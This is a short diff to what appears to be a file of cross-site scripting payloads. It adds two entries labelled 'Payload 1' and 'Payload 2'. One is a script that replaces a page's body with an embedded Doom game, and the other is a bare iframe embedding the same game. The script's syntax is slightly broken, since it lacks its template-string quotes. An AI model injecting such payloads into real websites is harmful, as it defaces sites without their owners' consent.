@@ -92,6 +92,19 @@ document.getElementsByTagName('body')[0].innerHTML = `
     </p>
   </center>`;
 </script>
+
+#Payload 1
+<script>
+  document.body.innerHTML = 
+    <center>
+      <iframe title="Doom" width="1000" height="900" src="https://emupedia.net/emupedia-game-doom1/asmjs/"></iframe>
+      <br><br><br><br>
+    </center>
+  ;
+</script>
+
+#Payload 2
+<iframe title="Doom" width="500" height="400" src="https://emupedia.net/emupedia-game-doom1/asmjs/"></iframe>
 ```
 
 ---
